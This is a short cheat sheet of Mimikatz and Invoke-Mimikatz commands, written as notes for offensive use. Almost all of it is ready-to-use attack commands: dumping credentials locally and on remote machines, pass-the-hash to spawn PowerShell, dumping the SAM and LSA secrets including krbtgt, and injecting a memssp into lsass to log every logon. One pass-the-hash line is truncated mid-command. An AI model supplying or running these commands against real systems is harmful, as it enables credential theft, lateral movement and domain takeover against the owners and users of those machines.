# MimiKatz.ps1

[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

**Mimikatz dump credentials on local machine**

```
Invoke-Mimikatz -Dumpcreds
```

**Mimikatz dump credentials on multiple remote machines**

```
Invoke-Mimikatz -Dumpcreds -Computername @(“<system1>”,”<system2>”)
Invoke-Mimikatz -Dumpcreds -ComputerName @("<computername 1>","<computername 2>")
```

**Mimikatz start powershell pass the hash (run as local admin)**

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm hash> /run:powershell.exe"'
```

**Mimikatz dump from SAM**

```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
```

or

```
reg save HKLM\SAM SamBkup.hiv
reg save HKLM\System SystemBkup.hiv
#Start mimikatz as administrator
privilege::debug
token::elevate
lsadump::sam SamBkup.hiv SystemBkup.hiv
```

**Mimikatz dump lsa (krbtgt to)**

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

**Pass the hash for local admin**

```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<computer> /user:Administrator /ntlm:<hash> /run:powe
```

**Use mimikatz to inject into lsass**

all logons are logged to C:\Windows\System32\kiwissp.log

```
Invoke-Mimikatz -Command ‘”misc:memssp”’
```
